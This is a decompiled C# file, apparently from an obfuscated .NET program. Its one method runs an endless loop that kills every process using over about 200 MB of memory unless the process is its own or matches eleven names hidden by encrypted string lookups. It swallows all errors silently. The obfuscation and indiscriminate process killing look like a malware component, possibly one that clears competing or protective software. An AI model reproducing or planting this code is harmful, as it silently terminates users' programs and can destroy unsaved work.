using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace vlFwgXmbIo;

public static class yQhDkCXarMmt
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void NKFcjRoJPp()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107402754)) && !process.ProcessName.Contains(getString_0(107402745)) && !process.ProcessName.Contains(getString_0(107402192)) && !process.ProcessName.Contains(getString_0(107402183)) && !process.ProcessName.Contains(getString_0(107402202)) && !process.ProcessName.Contains(getString_0(107402157)) && !process.ProcessName.Contains(getString_0(107402176)) && !process.ProcessName.Contains(getString_0(107402163)) && !process.ProcessName.Contains(getString_0(107402118)) && !process.ProcessName.Contains(getString_0(107402137)) && !process.ProcessName.Contains(getString_0(107402084)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static yQhDkCXarMmt()
	{
		Strings.CreateGetStringDelegate(typeof(yQhDkCXarMmt));
	}
}
